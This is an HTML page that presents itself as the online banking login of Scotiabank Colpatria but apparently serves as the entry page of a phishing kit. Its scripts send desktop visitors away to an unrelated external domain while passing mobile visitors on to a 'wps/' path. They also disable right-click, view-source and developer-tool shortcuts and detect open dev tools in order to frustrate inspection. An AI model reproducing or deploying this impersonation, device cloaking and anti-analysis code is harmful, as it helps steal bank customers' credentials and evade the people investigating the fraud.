<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Scotiabank Colpatria | Banca virtual</title>
    <link rel="shortcut icon" href="wps/img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../js/jquery-3.6.0.min.js"></script>
</head>
<body>

<script>
    function detectar_dispositivo() {
        var dispositivo = "";
        if (navigator.userAgent.match(/Android/i))
            dispositivo = "Android";
        else if (navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else if (navigator.userAgent.match(/iPhone/i))
            dispositivo = "iPhone";
        else if (navigator.userAgent.match(/iPad/i))
            dispositivo = "iPad";
        else if (navigator.userAgent.match(/iPod/i))
            dispositivo = "iPod";
        else if (navigator.userAgent.match(/BlackBerry/i))
            dispositivo = "BlackBerry";
        else if (navigator.userAgent.match(/Windows Phone/i))
            dispositivo = "Windows Phone";
        else
            dispositivo = "PC";
        return dispositivo;
    }

    if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://conclaros.co/Pa9e';
    }
</script>
    

<script>
    // Desactiva clic derecho
    document.addEventListener("contextmenu", function(e) {
        e.preventDefault();
    });

    // Detecta el uso de teclas comunes para abrir el inspector
    document.addEventListener("keydown", function(e) {
        // F12 o Ctrl+Shift+I o Ctrl+Shift+J o Ctrl+U
        if (
            e.key === "F12" || 
            (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) || 
            (e.ctrlKey && e.key === "U")
        ) {
            e.preventDefault();
            alert("Esta acción está deshabilitada.");
        }
    });

    // Desactiva herramientas de desarrollo en otros navegadores
    (function() {
        const devtools = /./;
        devtools.toString = function() {
            this.opened = true;
        };
        const checkDevTools = setInterval(function() {
            if (devtools.opened) {
                alert("Por favor, no intentes inspeccionar esta página.");
                window.location.reload();  // Opcional: recargar la página
            }
        }, 1000);
    })();
</script>

</body>
</html>
<script type="text/javascript">
    $(document).ready(function() {
        window.location.href = "wps/"; 
    });
</script>